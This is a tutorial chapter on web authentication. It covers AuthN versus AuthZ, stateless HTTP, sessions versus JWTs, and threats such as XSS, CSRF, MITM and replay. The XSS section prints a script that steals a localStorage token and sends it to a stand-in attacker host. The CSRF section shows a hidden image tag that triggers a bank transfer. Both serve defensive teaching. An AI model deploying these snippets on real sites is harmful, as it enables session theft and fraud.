# Chapter 1: Authentication Fundamentals & The Stateless Web

> *"Before a computer system can decide what you are allowed to do, it must first establish beyond doubt who you are."*

---

## 1.1 The Essence of Identity: Who Are You vs. What Can You Do?

In computer systems, questions of identity and permissions are broken down into two distinct disciplines that are frequently confused: **Authentication** and **Authorization**.

```mermaid
flowchart LR
    A["User Request"] --> B{"Authentication (AuthN)\n'Who are you?'"}
    B -- Identity Verified --> C{"Authorization (AuthZ)\n'What are you allowed to do?'"}
    B -- Invalid Identity --> D["HTTP 401 Unauthorized\n(Reject)"]
    C -- Has Admin Role --> E["HTTP 200 OK\n(Allow Action)"]
    C -- Insufficient Privileges --> F["HTTP 403 Forbidden\n(Reject)"]
```

### 1. Authentication (AuthN)
* **Question**: *"Who are you?"*
* **Purpose**: Establishing and verifying the identity of a client or human being.
* **Examples**:
  - Submitting an OTP sent to your WhatsApp number `+91 94375 55900`.
  - Logging in with your Google account via OAuth2.
  - Swiping a fingerprint or authenticating with Face ID.
* **HTTP Status Code on Failure**: **`401 Unauthorized`** (literally: *"I don't know who you are, or your credentials are invalid"*).

### 2. Authorization (AuthZ)
* **Question**: *"What are you permitted to do?"*
* **Purpose**: Determining whether an already-authenticated user has the privileges to access a resource or execute an action.
* **Examples**:
  - Can this user access `/api/admin/config` to pause the quiz? Only if their role is `admin`.
  - Can this user submit answers to Week 40? Yes, if their role is `member` and the quiz is active.
* **HTTP Status Code on Failure**: **`403 Forbidden`** (literally: *"I know exactly who you are, but you do not have permission to touch this resource"*).

---

## 1.2 The Dilemma of HTTP: The Stateless Protocol

To understand why modern authentication works the way it does, we must understand the fundamental architecture of the World Wide Web: the **HyperText Transfer Protocol (HTTP)**.

HTTP is strictly **stateless**. This means:
> Every HTTP request executed between a web browser and a backend server is completely independent. The server retains **zero intrinsic memory** of past requests from the same client.

Imagine walking into a bank where the teller suffers from total amnesia every three seconds:
1. You say: *"Hello, I am Alice, here is my passport."* The teller inspects your passport and says: *"Hello Alice!"*
2. Two seconds later, you say: *"I would like to withdraw \$100."*
3. The teller looks at you blankly and says: *"Who are you? I've never seen you before."*

If HTTP is stateless, how does a user stay "logged in" as they browse from the Welcome Lounge to the Quiz page, check their Profile, and submit scores?

There are two primary paradigms to solve this:
1. **Stateful Session Cookies** (The Traditional Way).
2. **Stateless Cryptographic Tokens** (The Modern Distributed Way).

---

## 1.3 Stateful Sessions vs. Stateless Tokens

### Paradigm A: Stateful Sessions (The "Cloakroom Ticket" Model)
In traditional web architectures (e.g., PHP, classic Django, Rails):
1. When a user logs in with a password or OTP, the server generates a random 32-character string called a **Session ID** (e.g., `sess_98a7df6b01c3`).
2. The server stores this ID in an in-memory table or database (e.g., Redis or MySQL):
   ```json
   {
     "sess_98a7df6b01c3": { "user_id": "9437555900", "role": "admin", "expires": "2026-11-03T18:00:00Z" }
   }
   ```
3. The server sends this ID back to the browser in a special header called `Set-Cookie: session_id=sess_98a7df6b01c3; HttpOnly`.
4. On every subsequent HTTP request, the browser automatically attaches `Cookie: session_id=sess_98a7df6b01c3`.
5. The server queries Redis/database to see if that session exists.

#### Why do Stateful Sessions break down at scale?
* **Database Bottleneck**: If 50,000 alumni take a live quiz simultaneously, the database must perform 50,000 read lookups on every single click just to verify who is making the request!
* **Horizontal Scaling Nightmare**: If your backend is deployed across 5 Cloud Run container instances or Kubernetes pods, Server A might have the session in memory, but the user's next request routes to Server B, which knows nothing about them! You are forced to maintain a centralized Redis cluster or implement sticky sessions.

```
       [ Client Request ]
               │
        ┌──────┴──────┐
        ▼             ▼
   [ Server A ]  [ Server B ]
        │             │
        └──────┬──────┘
               ▼
     [ Centralized Redis DB ]  <-- Every single HTTP request hits this database!
```

---

### Paradigm B: Stateless Cryptographic Tokens (The "Certified Passport" Model)
Instead of keeping a session in server memory, what if the server could issue a **tamper-proof digital document** directly to the client?

Think of a government-issued passport:
- When you cross a border, the immigration officer does not phone the President to ask if you exist.
- Instead, the officer inspects the digital watermark and cryptographic signature on the passport itself.
- If the signature is valid, unexpired, and hasn't been tampered with, the officer trusts the claims written inside the passport (Name, Date of Birth, Citizenship).

This is precisely how **JSON Web Tokens (JWT)** work:
1. When the user logs in, the server generates a payload containing the user's ID, role, and expiration date.
2. The server cryptographically signs this payload using a secret key known only to the server.
3. The server hands the resulting token string to the client.
4. On future requests, the client attaches the token in an HTTP header:
   ```http
   Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
   ```
5. **Any server instance** can verify the cryptographic signature using the secret key in less than a millisecond **without querying a database!**

```
       [ Client Request + Signed JWT ]
               │
        ┌──────┴──────┐
        ▼             ▼
   [ Server A ]  [ Server B ]  <-- Both verify signature locally in 0.0001s!
        │             │
        └──────┬──────┘
         (No DB lookup needed!)
```

---

## 1.4 Web Security Threat Models: The Battlefield

When designing an authentication system, you are defending against active adversaries on an untrusted network. Here are the four primary attack vectors every engineer must understand:

### 1. Cross-Site Scripting (XSS)
* **The Attack**: An attacker injects malicious JavaScript into your webpage (for example, via an unsanitized comment box or a compromised third-party npm package).
* **The Threat to Auth**: If your authentication token is stored in the browser's `localStorage`, the attacker's script can read it and exfiltrate it to their server:
  ```javascript
  // Malicious injected script
  const stolenToken = localStorage.getItem('access_token');
  fetch('https://evil-hacker.com/steal?token=' + stolenToken);
  ```
* **Defense**: Sanitize all user input, enforce a strict Content Security Policy (CSP), and minimize the lifetime of tokens stored on the client.

### 2. Cross-Site Request Forgery (CSRF)
* **The Attack**: You are logged into your bank website (`mybank.com`) using traditional cookies. You visit an attacker's website (`evil.com`) in another tab. `evil.com` includes a hidden image or form:
  ```html
  <img src="https://mybank.com/api/transfer?amount=1000&to=attacker" />
  ```
* Because browsers **automatically send cookies** with cross-origin requests, `mybank.com` thinks *you* made the request and transfers your money!
* **Why Bearer Tokens in Headers Prevent CSRF**:
  Unlike cookies, browsers **never automatically attach** HTTP `Authorization: Bearer <token>` headers to cross-origin requests. An attacker on `evil.com` cannot force your browser to construct a custom `Authorization` header containing your JWT unless they already have XSS execution inside your origin!

### 3. Man-in-the-Middle (MITM) Sniffing
* **The Attack**: A user connects to an open Wi-Fi network at an airport or coffee shop. An attacker runs packet-sniffing software (like Wireshark) to inspect all network traffic flying through the air.
* **The Threat**: If the application uses plain HTTP, the attacker reads the phone number, OTP, and Bearer token in plaintext.
* **Defense**: **Mandatory TLS/HTTPS**. Every packet is encrypted end-to-end between the client's browser and the Cloud Run / GCP load balancer. An eavesdropper sees only random encrypted noise.

### 4. Replay Attacks
* **The Attack**: An attacker intercepts a legitimate API request containing a valid token and re-sends that exact request 10 hours later to impersonate the user.
* **Defense**:
  1. **Short Expiration Windows**: Access tokens must expire quickly (e.g., 15 minutes). After 15 minutes, replaying the token fails with `HTTP 401: Token has expired`.
  2. **Single-Use Consumption**: One-Time Passwords (OTPs) must be deleted from the database the instant they are used once.

---

## 1.5 Summary of Key Concepts

1. **Authentication (AuthN)** validates *identity* (`401 Unauthorized` if invalid).
2. **Authorization (AuthZ)** validates *privileges* (`403 Forbidden` if denied).
3. **HTTP is stateless**; state must either be stored on the server (Sessions) or mathematically verified on the client (Tokens).
4. **Stateless JWTs** eliminate database bottlenecks and enable horizontal scaling across microservices.
5. **Bearer tokens** in headers provide built-in immunity against CSRF attacks, while requiring short lifespans to mitigate XSS risks.

---

## 🧠 Chapter 1 Review Questions

Try answering these questions yourself before consulting the [Appendix](07_APPENDIX_REVIEW_QUESTIONS_AND_ANSWERS.md)!

1. **Conceptual**: A user successfully logs in, but when trying to delete another member's quiz submission, they receive an HTTP error. Should the server return `401 Unauthorized` or `403 Forbidden`? Explain why.
2. **Architectural**: In a stateful session architecture with 10 backend servers, what happens if Server #1 creates a session in local RAM, but the client's subsequent request is routed to Server #5 by the load balancer? Name two ways engineers traditionally work around this, and why tokens are superior.
3. **Security Analysis**: Explain why storing an authentication token in an HTTP header (`Authorization: Bearer ...`) makes an application naturally immune to Cross-Site Request Forgery (CSRF) attacks compared to classic browser cookies.
4. **Threat Scenario**: If an attacker intercepts an access token over an insecure network, what prevents them from using that token forever? What parameter inside the token enforces this rule?
